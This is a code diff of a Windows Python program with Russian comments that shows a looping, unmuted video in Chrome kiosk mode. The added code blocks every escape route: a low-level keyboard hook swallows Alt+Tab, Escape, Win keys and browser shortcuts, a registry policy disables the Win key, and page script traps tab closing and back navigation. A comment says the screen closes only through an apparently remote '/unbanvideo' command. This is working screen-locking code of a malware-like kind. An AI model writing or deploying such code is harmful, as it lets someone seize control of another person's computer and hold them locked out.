@@ -398,16 +398,34 @@ _video_stop     = threading.Event()
 _video_window   = None  # tkinter overlay для кнопок поверх Chrome
 
 def _block_alttab(enable: bool):
-    """Устанавливает/снимает low-level keyboard hook блокирующий Alt+Tab."""
+    """Устанавливает/снимает low-level keyboard hook, блокирующий все способы выйти из Chrome."""
     import ctypes
     import ctypes.wintypes
 
     WH_KEYBOARD_LL = 13
     WM_KEYDOWN     = 0x0100
     WM_SYSKEYDOWN  = 0x0104
+    WM_KEYUP       = 0x0101
+    WM_SYSKEYUP    = 0x0105
+
+    # Виртуальные коды клавиш
     VK_TAB         = 0x09
     VK_ESCAPE      = 0x1B
     VK_F4          = 0x73
+    VK_F11         = 0x7A
+    VK_LWIN        = 0x5B
+    VK_RWIN        = 0x5C
+    VK_D           = 0x44   # Win+D (свернуть всё)
+    VK_T           = 0x54   # Ctrl+T (новая вкладка)
+    VK_W           = 0x57   # Ctrl+W (закрыть вкладку)
+    VK_N           = 0x4E   # Ctrl+N (новое окно)
+    VK_L           = 0x4C   # Ctrl+L (адресная строка)
+    VK_F           = 0x46   # Ctrl+F (поиск)
+
+    # Полный список блокируемых VK
+    BLOCKED_VK = {VK_TAB, VK_ESCAPE, VK_F4, VK_F11,
+                  VK_LWIN, VK_RWIN,
+                  VK_D, VK_T, VK_W, VK_N, VK_L, VK_F}
 
     global _kbd_hook
     user32 = ctypes.windll.user32
@@ -421,17 +439,30 @@ def _block_alttab(enable: bool):
     HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)
 
     def hook_proc(nCode, wParam, lParam):
-        if nCode >= 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
+        if nCode >= 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN, WM_KEYUP, WM_SYSKEYUP):
             vk = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong))[0]
-            # Блокируем Alt+Tab, Alt+F4, Escape
-            if vk in (VK_TAB, VK_F4, VK_ESCAPE):
-                return 1
+            if vk in BLOCKED_VK:
+                return 1  # блокируем — не передаём дальше
         return user32.CallNextHookEx(None, nCode, wParam, lParam)
 
     _hook_fn = HOOKPROC(hook_proc)
     _kbd_hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, _hook_fn, None, 0)
     # Держим ссылку чтобы GC не удалил
     _block_alttab._fn = _hook_fn
+
+    # Дополнительно: отключаем кнопку Win через реестр (TaskbarNoWinKey)
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                             r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
+                             0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+        # Применяем немедленно
+        ctypes.windll.user32.SendMessageW(0xFFFF, 0x001A, 0, "Policy")
+    except Exception as e:
+        log.warning(f"Registry WinKey block failed: {e}")
+
     log.info(f"Keyboard hook set: {_kbd_hook}")
 
 
@@ -448,25 +479,79 @@ def _find_chrome() -> str:
     return "chrome.exe"  # fallback — если в PATH
 
 
-def _make_video_html(video_path: str) -> str:
+def _make_video_html(video_path: str, duration: int = 0) -> str:
     """Создаёт временный HTML файл с видео-плеером."""
     import tempfile
-    # Конвертируем путь в file:// URL
     file_url = "file:///" + video_path.replace(chr(92), "/")
+    # duration=0 означает бесконечно (закрывается только через /unbanvideo)
     html = f"""<!DOCTYPE html>
 <html>
 <head>
 <meta charset="utf-8">
 <style>
   * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-  body {{ background: #000; width: 100vw; height: 100vh; overflow: hidden; }}
-  video {{ width: 100%; height: 100%; object-fit: contain; }}
+  html, body {{ background: #000; width: 100vw; height: 100vh; overflow: hidden; }}
+  video {{ width: 100%; height: 100%; object-fit: contain; display: block; }}
+  #timer {{
+    position: fixed; bottom: 18px; left: 50%; transform: translateX(-50%);
+    color: rgba(255,255,255,0.55); font: 16px/1 'Segoe UI', sans-serif;
+    background: rgba(0,0,0,0.45); padding: 6px 18px; border-radius: 20px;
+    pointer-events: none; display: none;
+  }}
 </style>
 </head>
 <body>
-<video autoplay loop muted playsinline>
+<video id="v" loop playsinline>
   <source src="{file_url}" type="video/mp4">
 </video>
+<div id="timer"></div>
+<script>
+  // ── Блокируем закрытие вкладки / навигацию назад ──
+  window.addEventListener('beforeunload', function(e) {{
+    e.preventDefault();
+    e.returnValue = '';
+    return '';
+  }});
+  history.pushState(null, '', location.href);
+  window.addEventListener('popstate', function() {{
+    history.pushState(null, '', location.href);
+  }});
+
+  // ── Автовоспроизведение со звуком ──
+  var v = document.getElementById('v');
+  v.volume = 1.0;
+  var playPromise = v.play();
+  if (playPromise !== undefined) {{
+    playPromise.catch(function() {{
+      // Если браузер заблокировал — пробуем через user interaction fallback
+      document.addEventListener('click', function() {{ v.play(); }}, {{ once: true }});
+      // Либо muted-старт → потом unmute
+      v.muted = true;
+      v.play().then(function() {{
+        v.muted = false;
+      }});
+    }});
+  }}
+
+  // ── Таймер (если duration > 0) ──
+  var duration = {duration};
+  if (duration > 0) {{
+    var timerEl = document.getElementById('timer');
+    timerEl.style.display = 'block';
+    var remaining = duration;
+    timerEl.textContent = remaining + ' сек';
+    var iv = setInterval(function() {{
+      remaining--;
+      if (remaining <= 0) {{
+        clearInterval(iv);
+        timerEl.textContent = '';
+        timerEl.style.display = 'none';
+      }} else {{
+        timerEl.textContent = remaining + ' сек';
+      }}
+    }}, 1000);
+  }}
+</script>
 </body>
 </html>"""
     tmp = tempfile.NamedTemporaryFile(suffix=".html", delete=False, mode='w', encoding='utf-8')
@@ -484,7 +569,7 @@ def show_video_overlay(video_path: str, lock: bool, duration: int,
     stop_event  = _video_stop
 
     # Создаём HTML страницу с видео
-    html_path = _make_video_html(video_path)
+    html_path = _make_video_html(video_path, duration)
 
     # Запускаем Chrome в киоск-режиме
     chrome = _find_chrome()
@@ -547,6 +632,16 @@ def show_video_overlay(video_path: str, lock: bool, duration: int,
     def do_close():
         stop_event.set()
         _block_alttab(False)
+        # Восстанавливаем Win-клавишу в реестре
+        try:
+            import winreg
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                                 r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
+                                 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+        except Exception:
+            pass
         if _chrome_proc:
             try:
                 _chrome_proc.terminate()
@@ -643,6 +738,16 @@ def unban_video():
         try:
             _video_stop.set()
             _block_alttab(False)
+            # Восстанавливаем Win-клавишу
+            try:
+                import winreg
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                                     r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
+                                     0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 0)
+                winreg.CloseKey(key)
+            except Exception:
+                pass
             if _chrome_proc:
                 _chrome_proc.terminate()
             _video_window.after(0, _video_window.destroy)
